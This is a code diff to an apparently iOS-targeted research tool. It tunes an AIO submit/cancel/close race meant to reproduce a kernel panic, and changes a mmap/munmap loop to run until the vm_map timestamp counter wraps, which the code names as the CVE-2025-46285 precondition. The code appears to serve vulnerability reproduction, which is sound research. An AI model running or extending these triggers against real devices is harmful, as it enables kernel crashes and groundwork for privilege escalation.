@@ -228,10 +228,12 @@ NSString *ModAioRace(void) {
             fsync(wfd);
             lseek(wfd, 0, SEEK_SET);
 
-            // submit AIO reads on it
-            enum { N = 16 };
+            // submit AIO reads on it (4 at a time: the per-process queue is small and
+            // EAGAINs once it saturates - measured: 16-at-a-time filled it forever)
+            enum { N = 4 };
             struct aiocb cb[N];
             char *rbuf[N];
+            int queued = 0;
             for (int i = 0; i < N; i++) {
                 rbuf[i] = malloc(2048);
                 memset(&cb[i], 0, sizeof cb[i]);
@@ -240,12 +242,20 @@ NSString *ModAioRace(void) {
                 cb[i].aio_nbytes = 2048;
                 cb[i].aio_offset = (off_t)(i * 2048);
                 cb[i].aio_sigevent.sigev_notify = SIGEV_NONE;
-                if (aio_read(&cb[i]) != 0)
-                    AveLog(S(@"[aio] round %d: aio_read %d -> %d", round, i, errno));
+                if (aio_read(&cb[i]) == 0) queued++;
+                else AveLog(S(@"[aio] round %d: aio_read %d -> %d (not queued)", round, i, errno));
             }
             // tear the descriptor down under the in-flight requests
             aio_cancel(wfd, NULL);   // NULL = cancel every outstanding request on this fd
             close(wfd);
+            // DRAIN: reap the entries (aio_return/aio_suspend) so the queue never
+            // saturates - without this the per-process AIO queue stays full and
+            // every later aio_read fails EAGAIN, which is exactly what happened
+            // on the first device run (35 = EAGAIN on all 16).
+            const struct aiocb *waitList[N];
+            for (int i = 0; i < N; i++) waitList[i] = &cb[i];
+            aio_suspend((void *)waitList, N, NULL);
+            for (int i = 0; i < N; i++) { ssize_t r = aio_return((struct aiocb *)&cb[i]); (void)r; }
             // let the completions/teardown run
             usleep(30000);
             for (int i = 0; i < N; i++) {
@@ -254,11 +264,11 @@ NSString *ModAioRace(void) {
             unlink(cpath);
             panics_expected++;
             if ((round & 7) == 7)
-                AveLog(S(@"[aio] %d rounds of AIO teardown churn done", round + 1));
+                AveLog(S(@"[aio] %d rounds of AIO teardown churn done (last round queued %d/4)", round + 1, queued));
         }
     }
     AveSetStatus(@"aio race churn done");
-    return S(@"aio teardown churn: %d rounds (submit + close + cancel); a panic = family B reproduced", panics_expected);
+    return S(@"aio teardown churn: %d rounds (submit + drain + close + cancel); a panic = family B reproduced", panics_expected);
 }
 static long long rs_vmwrap_read(void) {
     FILE *f = fopen([[[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
@@ -282,7 +292,13 @@ static void rs_vmwrap_save(long long ops) {
 }
 
 NSString *ModVmMapWrap(void) {
-    const long long kRuns = 60000000;      // mmap+munmap pairs per launch
+    // The device measurement (24.11): 4.05 Mops/s on one map -> 2^32 wraps in
+    // ~17.7 minutes.  So this now runs until the accumulated counter reaches
+    // the wrap (resumable across launches via VMWRAP in the forensic file),
+    // with a hard time cap.  Anything that breaks during the wrap is the
+    // CVE-2025-46285 precondition firing.
+    const long long kTarget = 4294967296LL + 1048576LL;   // 2^32 + margin
+    const double kTimeCapSecs = 1500.0;                   // 25 min per launch
     long long done0 = rs_vmwrap_read();
     AveLog(@"[vmwrap] === CVE-2025-46285: vm_map timestamp (32-bit version counter) wrap measurement ===");
     AveLog(S(@"[vmwrap] previous launches: %lld ops", done0));
@@ -296,7 +312,7 @@ NSString *ModVmMapWrap(void) {
     clock_gettime(CLOCK_MONOTONIC, &t0);
     long long n = 0;
     int first_errno = 0;
-    for (long long i = 0; i < kRuns; i++) {
+    for (long long i = 0; ; i++) {
         // each pair = one entry insert + one remove in the SAME map
         // (plain mmap/munmap: every insert/remove bumps map->timestamp)
         void *p = mmap(NULL, kPage, PROT_READ | PROT_WRITE,
@@ -311,7 +327,15 @@ NSString *ModVmMapWrap(void) {
         if ((i & 0xFFFFFF) == 0xFFFFFF) {
             clock_gettime(CLOCK_MONOTONIC, &t1);
             double el = (t1.tv_sec - t0.tv_sec) + (t1.tv_nsec - t0.tv_nsec) / 1e9;
-            AveLog(S(@"[vmwrap] %lld ops in %.1fs (%.2f Mops/s)", n, el, n / el / 1e6));
+            AveLog(S(@"[vmwrap] %lld ops in %.1fs (%.2f Mops/s) total %lld", n, el, n / el / 1e6, done0 + n));
+            if (done0 + n >= kTarget) {
+                AveLog(S(@"[vmwrap] *** 2^32 WRAP TARGET REACHED (total %lld) ***", done0 + n));
+                break;
+            }
+            if (el >= kTimeCapSecs) {
+                AveLog(@"[vmwrap] time cap reached - relaunch to continue (resumable)");
+                break;
+            }
         }
     }
     clock_gettime(CLOCK_MONOTONIC, &t1);
